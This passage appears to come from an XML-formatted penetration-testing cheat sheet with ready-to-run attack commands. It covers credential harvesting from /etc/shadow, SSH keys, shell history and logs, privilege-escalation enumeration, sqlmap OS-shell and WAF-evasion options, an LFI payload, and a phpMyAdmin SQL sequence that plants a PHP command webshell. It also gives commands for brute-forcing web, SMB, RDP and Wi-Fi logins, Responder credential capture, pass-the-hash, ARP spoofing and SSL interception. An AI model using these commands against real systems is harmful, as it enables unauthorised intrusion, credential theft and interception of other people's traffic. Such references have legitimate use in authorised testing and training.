    netstat -antup | grep -v 'TIME_WAIT'
    netstat -antpx
    netstat -tulpn
    netstat -ant
    chkconfig --list
    chkconfig --list | grep 3:on
    last
    
Cached Connections:
    arp -e
    arp | grep -v incomplete
    route
    route -nee
    cat /etc/hosts
    
Scan for WiFi:
    iwlist [interface] scan
    
Check Outbound Ports:
    traceroute -T -p [port] [outside ip]</info>
        </option>
        <option name="Sensitive Files">
            <info>Dump information found in sensitive files.

Files in home:
    find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2&gt;/dev/null | column -t 
            
Hashes:
    cat /etc/shadow
    cat /etc/login.defs | grep ENCRYPT_METHOD
    
Mail:
    ls -lAhR /var/mail
    ls -lAhR /var/spool/mail
    
Home Directory:
    ls -lAhR /root
    ls -lAhR /home
    
Configuration Files:
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /var/apache2/config.inc
    cat /var/lib/mysql/mysql/user.MYD
    cat /root/anaconda-ks.cfg
    cat /etc/syslog.conf
    cat /etc/chttp.conf
    cat /etc/lighttpd.conf
    cat /etc/cups/cupsd.conf
    cat /etc/indetd.conf
    cat /etc/apache2/apache2.conf
    cat /etc/my.conf
    cat /etc/httpd/conf/httpd.conf
    cat /opt/lampp/etc/httpd.conf
    ls -lAR /etc/ | awk '$1 ~ /^.*r.*/'
    find /etc -type f -name '*.conf'
    find /etc -type f -name '*.config'
    find /opt -type f -name '*.conf'
    find /opt -type f -name '*.config'
    
Private Keys (SSH):
    ls -lAh ~/.ssh
    ls -lAh /etc/ssh
    
Private Keys (VPN):
    ip xfrm state list
    
History:
    history
    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history
    
Log Files:
    cat /var/log/messages 2&gt;/dev/null
    cat /private/var/log/system.log 2&gt;/dev/null
    cat /etc/httpd/logs/*log 2&gt;/dev/null
    cat /var/log/apache2/*log 2&gt;/dev/null
    cat /var/log/auth.log 2&gt;/dev/null
    cat /var/log/chttp.log 2&gt;/dev/null
    cat /var/log/cups/error_log 2&gt;/dev/null
    ls -lAhR /var/log
    ls -lAh /etc/httpd/logs
    ls -lAh /var/webmin
    ls -lAh /var/www/logs
    ls -lAh /var/lib/dhcp3
    
Logs containing 'username':
    find /var/log -name '*.log' 2&gt;/dev/null | xargs -l10 egrep 'username' 2&gt;/dev/null
    
Logs containing 'password', 'pwd', 'passwd', 'pass:', 'pass-', 'pass=':
    find /var/log -name '*.log' 2&gt;/dev/null | xargs -l10 egrep 'pwd|password|passwd|pass:|pass-|pass=' 2&gt;/dev/null
    
Config files containing 'username':
    find /etc -name '*.c*' 2&gt;/dev/null | xargs -l10 egrep 'username' 2&gt;/dev/null
    
Config files containing 'password', 'pwd', 'passwd', 'pass:', 'pass-', 'pass=':
    find /etc -name '*.c*' 2&gt;/dev/null | xargs -l10 egrep 'pwd|password|passwd|pass:|pass-|pass=' 2&gt;/dev/null</info>
        </option>
        <option name="Exploitable Locations">
            <info>Dump locations to place possible privilege escalation payloads.
                
Writable cron directories:
    ls -lAR /etc/cron* 2&gt;/dev/null | awk '$1 ~ /w.$/'
    
Writable etc directories:
    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null     # Anyone
    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null       # Owner
    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null    # Group
    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null        # Other
    find /etc/ -readable -type f 2&gt;/dev/null               # Anyone
    find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone
    
World-Writeable directories:
    find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2&gt;/dev/null
    find / \( -wholename '/home/homedir*')
    find / -writable -type d 2&gt;/dev/null
    find / -perm -222 -type d 2&gt;/dev/null
    find / -perm -o w -type d 2&gt;/dev/null
    
World-Executable directories:
    find / -perm -o x -type d 2&gt;/dev/null
    
World-Writeable and World-Executable directories:
    find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null
    
Sticky Bit directories:
    find / -perm -1000 -type d 2&gt;/dev/null
    
World-Writeable files:
    find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2&gt;/dev/null
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
    find / -perm -2 ! -type l -ls 2>/dev/null
    
No-Owner files:
    find /dir -xdev \( -nouser -o -nogroup \) -print
    
SGID files:
    find / -perm -g=s -type f 2&gt;/dev/null

SUID files:
    find / -perm -u=s -type f 2&gt;/dev/null
    
SGID or SUID files:
*   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null
    find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2&gt;/dev/null
    find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null
    
Rhost config files:
    find /home -name *.rhosts -print 2&gt;/dev/null
    

Automated Services:
---------------------------

unix-privesc-check:
    wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
    tar xvzf unix-privesc-check-1.4.tar.gz
    cd unix-privesc-check-1.4
    ./unix-privesc-check</info>
        </option>
        <option name="Available Utilities">
            <info>Dump information about the applications installed available to use.
       
       find / -name [utility name]
       
Sudo:
    sudo -V 2&gt;/dev/null | grep version
    rpm -q sudo 2&gt;/dev/null
    
Netcat:
    nc -h 2&gt;&amp;1 | head -n 1 2&gt;/dev/null
    
Ncat:
    ncat --version 2&gt;/dev/null
    
Telnet:
    find / -name telnet
    
SSH:
    cat /etc/ssh/sshd_config | grep Protocol 2&gt;/dev/null
    
Python:
    python --version 2&gt;&amp;1 | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
Perl:
    perl -v 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
Java:
    java -version 2&gt;&amp;1 | sed '/^\s*$/d' | head -n 3 2&gt;/dev/null
    
Ruby:
    ruby -v 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
gcc:
    gcc --version 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
cc:
    cc --version 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null

PHP:
    php -v 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
Apache:
    httpd -v 2&gt;/dev/null
    apache -v 2&gt;/dev/null
    apache2 -v 2&gt;/dev/null
    
MySQL:
    mysql --version 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
Postgres:
    psql -V 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
TCPDump:
    tcpdump --version 2&gt;&amp;1 | sed '/^\s*$/d' | head -n 3 2&gt;/dev/null
    
Nmap:
    nmap --version 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
Rinetd:
    find / -name rinetd 2&gt;/dev/null
    
FPipe:
    find / -name fpipe 2&gt;/dev/null
    
wget:
    wget --version 2&gt;/dev/null | sed '/^\s*$/d' | head -n 1 2&gt;/dev/null
    
tftp:
    find / -name tftp 2&gt;/dev/null
    
ftp:
    find / -name ftp 2&gt;/dev/null
    
scp:
    find / -name scp 2&gt;/dev/null</info>
        </option>
    </area>
    <area name="File">
        <option name="Check Type">
            <info>Check the type of file based on the contents.
            
Usage:
    file [file]</info>
        </option>
        <option name="Hidden Strings">
            <info>Check a file (e.g. image) for hidden messages.
                
Usage:
    strings [file] | less</info>
        </option>
        <option name="Find Embedded Files">
            <info>Search for embedded files within a file.
            
Usage:
    foremost -i [file] -T
    (or)
    binwalk [file]</info>
        </option>
        <option name="Find Embedded Files - Rar">
            <info>Check if a file is hiding another file inside it using a RAR archive.
            
Usage:
    strings [file] | grep "Rar!"
    
If true:
    cp [file] [file].rar
    
    List:
        unrar l [file].rar
    Extract:
        unrar e [file].rar</info>
        </option>
        <option name="Find Embedded Files - Steganography">
            <info>Extract a file embedded through steganography.
            
Usage:
    steghide extract -sf [file]</info>
        </option>
        <option name="Crack a Zip - Dictionary Attack">
            <info>Use a dictionary attack to crack an encrypted .zip file.
            
Usage:
    fcrackzip -D -p [wordlist] -u [input].zip</info>
        </option>
        <option name="Crack a private key passphrase - Dictionary Attack">
            <info>Use a dictionary attack to crack the passphrase of a private key file.
            
Usage:
    ssh2john [sshkey] > converted_key
    john converted_key --wordlist=[wordlist]</info>
        </option>
    </area>
</type>
<type name="Attack">
    <area name="Web Application">
        <option name="SQL Injection">
            <info>Exploit SQL Injection vulnerabilities on a Web Application.
            
Usage:
    sqlmap -u [url] [options]


Basic
-----------------------

Scan:
    sqlmap -u [url] --crawl=1
 
Get:
    sqlmap -u [url]?[parameters] [options]

Post:
    sqlmap -u [url] --data='[parameter]=[value];[parameter]=[value]' [options]

Cookie:
    sqlmap -u [url] --cookie='[cookie]=[value];[cookie]=[value]' [options]


Enumeration Options
-----------------------

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --dbs               Enumerate DBMS databases
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate


Own Options
-----------------------

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --file-read=RFILE   Read a file from the back-end DBMS file system
    --file-write=WFILE  Write a local file on the back-end DBMS file system


Advanced Options
-----------------------

    --user-agent=AGENT              HTTP User-Agent header value
    --random-agent                  Use randomly selected HTTP User-Agent header value
    --proxy='http://[ip]:[port]'    Use a proxy to connect to the target URL
    --tor                           Use Tor anonymity network
    --check-tor                     Check to see if Tor is used properly
    --eval=EVALCODE                 Evaluate provided Python code before the request
    

Evading Web Application Firewall
---------------------------------

Identify WAF:
    --identify-waf

Bypass keyword filters with encoding:
    --tamper "charencode.py"
    --tamper "chardoubleencode.py"
    --tamper "charunicodeencode.py"

Replace spaces with block comments with random text:
    --tamper "space2hash.py"
    --tamper "space2morehash.py"
    
Effective against ASP/ASP.NET application:
    --tamper "charunicodeencode.py"
    --tamper "percentage.py"
    
Effective against underlying MySQL database:
    --tamper "space2hash.py"
    --tamper "space2mysqlblank.py"
    
Other tampers:
    /usr/share/sqlmap/tamper</info>
            
        </option>
        <option name="Cross Site Scripting">
            <info>Exploit Cross Site Scripting vulnerabilities on a Web Application.
            
Usage:
    xsser -u [url]
    
    
Basic
-----------------------

Get:
    xsser -u [url base] -g /[url extension]?[parameter]=[value]&amp;[parameter]=[value]
    
Post:
    xsser -u [url] -p '[parameter]=[value]&amp;[parameter]=[value]'

Cookie:
    xsser -u [url] --cookie=[cookie]

Advanced Options
-----------------------

    -c                  Crawl
    --Cw=[depth]        Set crawl depth
    --user-agent=AGENT  Change your HTTP User-Agent header (default SPOOFED)
    --proxy=PROXY       Use proxy server (tor: http://localhost:8118)
    --delay=DELAY       Delay in seconds between each HTTP request (default 0)

Check for XSS Filter
-----------------------

    --hash              send a unique hash, without vectors, to check if target reflects request
    --heuristic         launch a heuristic test to discover which parameters are filtered ;\/&lt;&gt;"'=


Evading XSS Filters
-----------------------

    --Str               Use method String.FromCharCode()
    --Une               Use Unescape() function
    --Mix               Mix String.FromCharCode() and Unescape()
    --Dec               Use Decimal encoding
    --Hex               Use Hexadecimal encoding
    --Hes               Use Hexadecimal encoding, with semicolons
    --Dwo               Encode vectors IP addresses in DWORD
    --Doo               Encode vectors IP addresses in Octal</info>
            
        </option>
        <option name="Directory Traversal">
            <info>Exploit Directory Traversal vulnerabilities on a Web Application.
                
Usage:
    dotdotpwn.pl -m http -h [target url]
(or)
    dotdotpwn.pl -m http-url -h [target url base] -u [whole url, TRAVERSAL as fuzzing placeholder] -k root</info>
        </option>
	<option name="Local File Inclusion (PHP Filter)">
		<info>Exploit a Local File Inclusion vulnerability against a php file with 'require_once()' designated by a request parameter.
			
Usage:
	http://127.0.0.1/index.php?p=php://filter/convert.base64-encode/resource=index
	(or)
	http://127.0.0.1/index.php?p=php://filter/convert.base64-encode/resource=index.php
			
Decode:
	echo [content] | base64 -d</info>
	</option>
        <option name="HTTP Login Dictionary Attack">
            <info>Attack a website HTTP access by brute forcing login.
            
Usage:
    medusa -h [target ip] -U [user list] -P [password list] -M http (-m DIR:/[subfolder])
    
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
        </option>
        <option name="Login-Page Dictionary Attack">
            <info>Attack a website by brute forcing login.
            
Usage:
    Get:
    
    Post:
        hydra -L [user list] -P [password list] [target ip] http-post-form "/[login page]:[post values with ^USER^ and ^PASS^]:[fail text | S = success text](:H=Cookie\: [cookie values])"
        
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
        </option>
        <option name="Joomla - Login Dictionary Attack">
            <info>Attack a Joomla site by brute forcing login.
            
Usage:
    nmap -sV --script http-joomla-brute --script-args '
        userdb=[userlist],
        passdb=[passlist],
        http-joomla-brute.hostname=[domain],
        http-joomla-brute.threads=3,
        brute.firstonly=[should stop on first success]' [target]
        
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
            
        </option>
        <option name="Wordpress - Login Dictionary Attack">
            <info>Attack a Wordpress site by brute forcing login.
            
Usage:
    wpscan -u [target] --threads 20 --wordlist [wordlist] --username [user]
(or)
    nmap --script http-wordpress-brute --script-args '
        userdb=[userlist],
        passdb=[passlist],
        http-wordpress-brute.hostname=[domain],
        http-wordpress-brute.threads=3,
        brute.firstonly=[should stop on first success]' [target]
        
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
            
        </option>
        <option name="phpMyAdmin - Upload Webshell">
            <info>Upload a webshell using phpMyAdmin.
            
Usage:
    CREATE TABLE hacker(
    Stack TEXT
    ) TYPE=MYSIaM;
    
    INSERT INTO hacker
    VALUES(
    '&lt;pre&gt;&lt;? @system($_REQUEST["cmd"]); ?&gt;&lt;/pre&gt;'
    );
    
    SELECT *
    INTO DUMPFILE '/var/www/backdoor.php'
    FROM hacker;</info>
        </option>
    </area>
    <area name="Penetrate Network">
        <option name="Auto-pwn WEP">
            <info>Attempt to automatically crack a WEP network.
                
WEP:
    wesside-ng -i [interface] -v [AP MAC address]</info>
        </option>
        <option name="Auto-pwn WEP/WPA/WPS">
            <info>Attempt to automatically crack a WEP/WPA/WPS Wi-Fi network.
                
Usage:
    wifite -mac -aircrack -dict [wordlist]
    (after it collects traffic)
            -&gt; select target</info>
        </option>
        <option name="Capture Traffic">
            <info>Capture Wi-Fi traffic.
            
Usage:
    (airmon-ng check kill)
    (ifconfig wlan0 up)
    airmon-ng start wlan0
    airodump-ng wlan0mon
        -&gt; Identify access point (AP)
    airodump-ng -c [AP channel] -w output --bssid [AP MAC address] wlan0mon
     -- capture traffic --
    
Cleanup:
    airmon-ng stop wlan0mon
    ifconfig wlan0 up</info>
            
        </option>
        <option name="Capture Handshake (WPA)">
            <info>Capture the authentication handshake in order to crack the password.
                
Usage:
    (While capturing traffic)
    aireplay-ng -0 1 -a [AP MAC address] -c [target MAC address] (-h [source MAC address]) wlan0mon
    
Troubleshooting:
    Check to see that "ACK" packets are returned.  If not, you might be too far away from the client or your wireless card is working in the wrong mode (b, g, n...).
    Some clients ignore broadcast deauthentications.  In that case, send the packet directly to the client.
            </info>
            
        </option>
        <option name="WEP Crack">
            <info>Crack the password for a WEP Wi-Fi network.
Usage:
    (After capturing about 15,000 packets)
    aircrack-ng [captured traffic].cap</info>
            
        </option>
        <option name="WPA Crack - Dictionary Attack">
            <info>Attempt to crack WiFi login credentials by trying every word in a wordlist.

Usage:
    (After capturing handshake)
    aircrack-ng -w [wordlist] [captured traffic].cap
    
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/fern-wifi/common.txt</info>
        </option>
        <option name="WPA Crack - Dictionary Attack + Rules">
            <info>Attempt to crack WiFi login credentials by trying every word in a wordlist and its alterations, according to a set of rules.
            
Usage:
    (After capturing handshake)
    hashcat -a 0 --stdout [wordlist] --rules [rules file] | aircrack-ng [captured traffic].cap
    
    
Built-in Rules:
-----------------------
    
Insert Year:
    ... -r /usr/share/hashcat/rules/T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
    
Quick:
    ... -r /usr/share/hashcat/rules/best64.rule
    
Weak:
    ... -r /usr/share/hashcat/rules/generated.rule
    
Solid:
    ... -r /usr/share/hashcat/rules/rockyou-30000.rule
    
Intense:
    ... -r /usr/share/hashcat/rules/d3ad0ne.rule
    
Epic:
    ... -r /usr/share/hashcat/rules/dive.rule
    
Random:
    ... -g [number of rules]</info>
            
        </option>
        <option name="WPA Crack - Brute Force Attack">
            <info>Attempt to crack WiFi login credentials by trying every possibility matching a certain mask or pattern.
            
Usage:
    (After capturing handshake)
    maskprocessor [mask] | aircrack-ng [captured traffic].cap

Built-in Character Sets:
    ?l = abcdefghijklmnopqrstuvwxyz
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
    ?d = 0123456789
    ?s =  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{|}~
    ?a = ?l?u?d?s
    
Custom Character Sets
    -1
    -2
    -3
    -4</info>
        </option>
        <option name="WPA Crack - Statistical Brute Force Attack">
            <info>Attempt to crack WiFi login credentials by trying every possibility matching a certain mask or pattern, sorted by statistical probability (Markov).
                
Usage:
    (After capturing handshake)
    statsprocessor --pw-min=[minLength] --pw-max=[maxLength] /usr/share/statsprocessor/hashcat.hcstat [mask] | aircrack-ng [captured traffic].cap

Built-in Character Sets:
    ?l = abcdefghijklmnopqrstuvwxyz
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
    ?d = 0123456789
    ?s =  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{|}~
    ?a = ?l?u?d?s
    
Custom Character Sets
    -1
    -2
    -3
    -4</info>
        </option>
        <option name="WPA Crack - Combination Attack">
            <info>Attempt to crack a list of hashes by trying every combination of words in a wordlist.
                
Usage (max N items each):
    (After capturing handshake)
    hashcat -a 8 --stdout --elem-cnt-max=[N] [wordlist] | aircrack-ng [captured traffic].cap

* Recommendation: Perform combination beforehand to create wordlist, then do dictionary attack + rules.</info>
            
        </option>
        <option name="WPA Crack - Permutation Attack">
            <info>Attempt to crack a list of hashes by trying every permutation of each word in a wordlist.
                
Usage:
    (After capturing handshake)
    hashcat -a 4 --stdout [wordlist] | aircrack-ng [captured traffic].cap

* Recommendation: Perform permutation beforehand to create wordlist, then do dictionary attack + rules.</info>
            
        </option>
        <option name="WPA Crack - Substitution Attack">
            <info>Attempt to crack a list of hashes by trying every word in a wordlist and every version of each word with common substitutions and toggles.
                
Usage:
    (After capturing handshake)
    hashcat -a 5 --stdout --table-file /usr/share/hashcat/tables/toggle_case_and_leet.table [wordlist] | aircrack-ng [captured traffic].cap</info>
            
        </option>
        <option name="WPA Crack - Online Service">
            <info>Submit WPA handshake to online cracking service.
                
Usage:
    besside-ng -b [AP MAC address] -s wpa.darkircop.org -v</info>
            
        </option>
    </area>
    <area name="Infiltrate Network">
        <option name="Rogue DNS Server">
            <info>Host a DNS server on the network, so that when devices query a new domain, they are taken to your web server.  This will only work for non-SSL encrypted domains.
            
Usage:
    (service apache2 start)
    dnsspoof [-f hostsfile] "udp dst port 53 and src [victim ip]"
    
HostFile Format:
[ip] [domain]

Note: if no hostfile provided, will route every intercepted dns query to your web server.</info>
            
        </option>
        <option name="Rogue LLMNR Server (Windows)">
            <info>Host a LLMNR server on the network, so that when Windows devices query a new domain, your server responds.
                
Usage:
    (configure)
    responder -I [interface]
    
Configurations: (/usr/share/responder/Responder.conf):
-------------------------------------------------------

Host custom web page:
    RespondTo = [target IP address]
    Serve-Html = On
    HtmlFilename = [custom web page]
        (default: /files/AccessDenied, pushes BindShell.exe - port 140)
    
Inject custom html into web page
    RespondTo = [target IP address]
    Serve-Html = Off
    HTMLToInject = [custom html code]
        (default: dumps credentials with SMB server)</info>
            
        </option>
        <option name="Rogue SMB Server (Windows)">
            <info>Windows computers keep track of local SMB shares via network requests.  Pose as an SMB share and respond to those requests, dumping their credentials.  Note: these hashes are NetNTLMv2 (salted), which cannot be used in pass the hash attacks.  Try cracking it or catch again with an SMB Relay.
    
Usage:
    (configure)
    responder -I [interface] -v
    
Configuration (/usr/share/responder/Responder.conf):
    Serve-Exe = Off
    Serve-Html = Off
    HTMLToInject = (blank)</info>
        </option>
        <option name="Rogue SMB Server + SMB Relay (Windows)">
            <info>Windows computers keep track of local SMB shares via network requests.  Pose as an SMB share and respond to those requests, dumping their credentials, then relaying those requests to a neighboring Windows machine with a payload attached.
            
Usage:
    (configure responder)
    responder -I [interface] -v
        +
    /usr/share/doc/python-impacket/examples/smbexec.py -h [target] -e [payload].exe
    
Responder Configuration (/usr/share/responder/Responder.conf):
    SMB = Off
    HTTP = Off</info>
        </option>
        <option name="Execute Over Domain (Windows)">
            <info>With domain credentials, execute commands on a remote windows machine.
           
Usage (Windows):
    C:\&gt; net time \\[remote server]
    C:\&gt; at \\[remote server] [HH:MM] [file] [args]

Usage (Local):
    pth-wmis -U [domain]\\[user]%[password] //[target ip] cmd.exe
(or)
    /usr/share/doc/python-impacket/examples/wmiexec.py -share [share] [domain]/[user]:[password]@[target]
(or)
[!] pth-winexe -U [domain]\\[user]%[password] --uninstall --system //[target ip] cmd.exe
        -&gt; this way is very loud, caught by AV</info>
            
        </option>
        <option name="Pass the Hash (Windows)">
            <info>Pass the NTLM hash of one Windows machine to gain a shell on another.
                
Usage:
    pth-wmis -U [domain]\\[user]%[hash] //[target ip] cmd.exe
(or)
    /usr/share/doc/python-impacket/examples/wmiexec.py -share [share] -hashes [LMhash:NThash] [domain]/[user]@[target]
(or)
[!] pth-winexe -U [domain]\\[user]%[hash] --uninstall --system //[target ip] cmd.exe
        -&gt; this way is very loud, caught by AV
        
If given NO PASSWORD******:(NT HASH) hash
    replace "NO PASSWORD******" with empy LM hash:
    aad3b435b51404eeaad3b435b51404ee:[NT hash]</info>
        </option>
        <option name="SMB Access">
            <info>Use an accessible SMB service for various reasons.
            
Enumerate:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target]
            
List drives:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -L
            
Recursively list directories and files:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -R
            
List files in specific directory:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -r [path]
    
Search file contents:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -F [pattern]
    * example pattern: SSN
        '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
        
Upload:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] --upload [source] [destination]
    
Download:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] --download [source]
    
Execute:
    smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -x [command]</info>
            
        </option>
        <option name="SMB Login - Dictionary Attack">
            <info>Check the login credentials for an SMB share using a dictionary attack.

Usage:
    acccheck -t [target] -u [user] -P [wordlist] -v
    
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
        </option>
        <option name="SNMP Login - Dictionary Attack">
            <info>Check the login credentials for an SNMP service using a dictionary attack.
                
Usage:
    onesixtyone -c [wordlist] [target]
    
Built in wordlist:
    /usr/share/doc/onesixtyone/dict.txt</info>
        </option>
        <option name="RDP Login - Dictionary Attack">
            <info>Check the login credentials for an RDP service using a dictionary attack.
                
Usage:
    ncrack -vv {--user [user] | -U [user list]} -P [password list] rdp://[target ip] (-g ssl=yes)
    
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
        </option>
        <option name="Service Login -  Dictionary Attack">
            <info>Attempt to crack the login credentials to a service using a dictionary attack.
            
Dictionary Attack:
    hydra {-l [user] | -L [user list]} -P [password list] [service]://[target]([:port]) -v
(or)
    medusa -h [target] -U [usernames] -P [passwords] -M [mode (dump with medusa -d)] -L -v 0

Advanced Options:
    -t [threads]    For session-based logins, set threads to 1
    -W [time]       Wait time between each connection a task performs (when -t 1).
    -S              connect via SSL
    -e nsr          check null password, check user as password, check reverse user as pass
            
    * Default Users: /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
    * Default Passwords: /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</info>
        </option>
        <option name="Service Login - Brute Force Attack">
            <info>Attempt to crack the login credentials to a service by trying every possible combination according to a pattern.

Usage:
    hydra -l [usr] -x [min]:[max]:[charsets] [service]://[target][:port] -v
        -&gt; charsets:
            1   contains numbers
            a   contains lowercase
            A   contains uppercase
                any other character is added to list</info>
        </option>
        <option name="MITM - ARP Spoof">
            <info>Poison the ARP cache of the default gateway and the target to route their traffic through you.  Helpful if you are on a switch and can't see all traffic or you want to do something with the traffic.
            
Usage:
    arpspoof -i [interface] -t [target] -r [default gateway]
    fragrouter -i [interface] -B1</info>
            
        </option>
        <option name="MITM - Rogue WPAD Server (Windows)">
            <info>Windows machines are configured to query the network for a proxy to use.  Host a WPAD proxy server to answer those queries.
                
Dump Hash:
    responder -wv -I [interface]
    
Ask for Credentials:
    responder -wbFv -I [interface]
    
Point traffic to Burpsuite:
    responder -wv -I [interface] -u 127.0.0.1:8080
    
Configurations: (/usr/share/responder/Responder.conf):
-------------------------------------------------------

Basic:
    RespondTo = [target IP address]

Host malicious .exe file:
    RespondTo = [target IP address]
    ExeFilename = [malicious .exe file]
        (default: files/BindShell.exe, port 140)
    ExeDownloadName = [malicious .exe file name]
        (default: ProxyClient.exe)
    (optional force) Serve-Always = On</info>
            
        </option>
        <option name="MITM (SSL) - SSLsplit">
            <info>When acting as a man in the middle, start an SSL service that will negotiate a secure connection between the attacker and the target, decrypt the traffic, then forward the traffic securely to the intended destination.
                
CAUTION: If certificate is not trusted or installed on the target, they will be warned of an attack.
   
NOTE: need SSL key (ca.key) and certificate (ca.cer) in current directory.
    -&gt; see Build -&gt; Misc -&gt; SSL Key and Certificate
    
Also make sure no other services are running (service Apache2 stop)

1) Route target traffic through attacker (e.g. ARP Spoof)
    arpspoof -i [interface] -t [target] -r [default gateway]

2) Set up Port Forwarding Rules:
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 80 -j REDIRECT --to-ports 8080     # HTTP
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 443 -j REDIRECT --to-ports 8443    # HTTPS
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 587 -j REDIRECT --to-ports 8443    # SMTP over SSL
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 465 -j REDIRECT --to-ports 8443    # SMTP over SSL
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 993 -j REDIRECT --to-ports 8443    # IMAP over SSL
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 5222 -j REDIRECT --to-ports 8080   # WhatsApp
                
3) Usage (output to [temporary directory]/[log directory]):
    sslsplit -D -l connections.log -j [temporary folder] -S [log directory] -k ca.key -c ca.cer ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
                
Cleanup:
    sysctl -w net.ipv4.ip_forward=0
    iptables -t nat -F</info>
        </option>
        <option name="MITM (SSL) - MITMProxy">
            <info>When acting as a man in the middle, MITMProxy enables the capture and manipulation of HTTPS traffic.  MITMProxy provides a certificate for you at (~/.mitmproxy/mitmproxy-ca-cert.cer).

NOTE: make sure no other services are running (service Apache2 stop)

1) Route target traffic through attacker (e.g. ARP Spoof)
    arpspoof -i [interface] -t [target] -r [default gateway]

2) Set up Port Forwarding Rules:
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 80 -j REDIRECT --to-ports 8080     # HTTP
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 443 -j REDIRECT --to-ports 8080    # HTTPS
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 587 -j REDIRECT --to-ports 8080    # SMTP over SSL
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 465 -j REDIRECT --to-ports 8080    # SMTP over SSL
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 993 -j REDIRECT --to-ports 8080    # IMAP over SSL
